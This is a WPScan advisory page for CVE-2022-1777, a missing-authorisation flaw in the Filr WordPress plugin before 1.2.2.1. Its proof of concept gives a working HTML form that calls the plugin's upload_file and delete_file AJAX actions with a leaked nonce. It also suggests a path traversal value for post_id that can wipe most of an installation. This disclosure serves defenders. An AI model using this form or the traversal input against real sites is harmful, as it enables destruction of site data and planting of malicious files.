=== Content from wpscan.com_e5894d4d_20250115_095352.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Filr - Secure Document Library < 1.2.2.1 - Subscriber+ AJAX Calls

### Description

The plugin does not have authorisation check in two of its AJAX actions, allowing them to be called by any authenticated users, such as subscriber. They are are protected with a nonce, however the nonce is leaked on the dashboard. This could allow them to upload arbitrary HTML files as well as delete all files or arbitrary ones.

### Proof of Concept

Affected AJAX actions: upload\_file and delete\_file. To get the nonce, search for uploader\_nonce in the dashboard.
The following actions can be triggered with any authenticated user. All listed actions were triggered with a subscriber account.
1. Restricted file upload.
It is possible to upload files without htaccess or any valid php extension. This means it it possible to upload html files. Those html files can be used to execute malicious javascript.
2. Data deletion over upload process
The upload function contains a bug, which allows to delete every file ( excluding directories and files with a leading dot ), which can be deleted by the executing user ( in my case www-data ). This bug can be used to delete nearly a whole wp installation. ( blank directory structure will remain )
3. Direct files deletion
The delete\_file function can be used to obtains identical results as described in 2.
You can use the following html form:
<form action="<your host here>/wp-admin/admin-ajax.php" method="post" enctype="multipart/form-data">
<input type="text" name="action" value="" placeholder="upload\_file or delete\_file">
<input type="text" name="nonce" value="" placeholder="your nonce here">
<!--
use post\_id values to create a directory. Dont use it for path traversal, if you want to successful upload a file. To wipe nearly the entire installation use eg. ../../../../../../../../../../
The uploaded file will be stored inside the directory specified in post\_id.
-->
<input type="text" name="post\_id" value="" placeholder="">
<!--
Your html file.
-->
<input type="file" name="file-upload" value="upload">
<!-- the following element is used for the delete\_file function call. -->
<!-- before unlink is called a file\_exists check is performed. -->
<input type="text" name="filename" placeholder="valid target file" >
<input type="submit" value="submit" >
</form>

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

filr-protection](https://a8cteam5105.wordpress.com/plugin/filr-protection/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 1.2.2.1

### References

CVE
[CVE-2022-1777](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1777)

### Classification

Type
NO AUTHORISATION

OWASP top 10
[A5: Broken Access Control](https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control)

CWE
[CWE-862](https://cwe.mitre.org/data/definitions/862.html)

CVSS
[9.9 (critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

### Miscellaneous

Original Researcher
dc11

Submitter
dc11

Verified
Yes

WPVDB ID
[a50dc7f8-a9e6-41fa-a047-ad1c3bc309b4](https://a8cteam5105.wordpress.com/vulnerability/a50dc7f8-a9e6-41fa-a047-ad1c3bc309b4/)

### Timeline

Publicly Published
2022-05-23 (about 2 years ago)

Added
2022-05-23 (about 2 years ago)

Last Updated
2023-02-19 (about 1 years ago)

### Other

Published
Title

Published
2024-07-16
Title
[Icegram Express - Email Subscribers, Newsletters and Marketing Automation Plugin < 5.7.27 - Missing Authorization](https://a8cteam5105.wordpress.com/vulnerability/9ccdbbeb-7a17-487c-b640-0f5dddd3250c/)

Published
2024-05-20
Title
[ShopLentor < 2.8.9 - Authenticated Option Update](https://a8cteam5105.wordpress.com/vulnerability/9bdc6c9c-aa3b-4600-ab47-b4416e9076eb/)

Published
2025-01-10
Title
[Coupon X: Discount Pop Up, Promo Code Pop Ups, Announcement Pop Up, WooCommerce Popups < 1.3.6 - Missing Authorization](https://a8cteam5105.wordpress.com/vulnerability/cc6afccd-d386-47c9-8016-be5e5b0d646b/)

Published
2024-08-02
Title
[File Manager Pro – Filester < 1.8.3 - Authenticated Plugin Settings Update](https://a8cteam5105.wordpress.com/vulnerability/385bf3c8-4351-44e3-aed3-3e528d6c588b/)

Published
2024-10-24
Title
[Greenshift – animation and page builder blocks <=9.7 - Missing Authorization](https://a8cteam5105.wordpress.com/vulnerability/3719fbb9-ebd3-4b82-9984-f865aed0a7ae/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

